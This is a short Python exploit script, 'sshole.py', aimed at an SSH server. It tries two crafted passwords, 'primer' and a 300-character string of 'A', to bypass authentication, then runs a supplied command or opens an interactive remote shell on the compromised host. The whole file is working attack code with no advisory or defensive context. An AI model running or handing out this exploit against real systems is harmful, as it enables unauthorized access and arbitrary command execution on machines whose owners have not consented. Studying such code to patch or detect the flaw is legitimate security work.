#!/usr/bin/env python3
"""
usage: sshole.py <host> <port> <user> [command]
"""
import socket
import sys

import paramiko

try:
    import readline
except ImportError:
    pass

if len(sys.argv) < 4:
    sys.exit(__doc__)

host, port, user, *cmd = sys.argv[1:]
port, cmd = int(port), cmd[0] if cmd else None

t = paramiko.Transport(socket.create_connection((host, port), timeout=10))
t.start_client(timeout=10)


for pw in ("primer", "A" * 300):
    try:
        t.auth_password(user, pw, fallback=False)
    except (paramiko.SSHException, OSError):
        pass
if not t.is_authenticated():
    sys.exit("[-] not vulnerable")

print(f"[+] authenticated as {user}")


def run(cmd):
    ch = t.open_session()
    ch.set_combine_stderr(True)
    ch.exec_command(cmd)
    return b"".join(iter(lambda: ch.recv(65536), b"")).decode(errors="replace")


if cmd:
    sys.stdout.write(run(cmd))
else:
    while True:
        try:
            line = input(f"{user}@{host}:$ ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if line in ("exit", "quit"):
            break
        if line:
            sys.stdout.write(run(line))
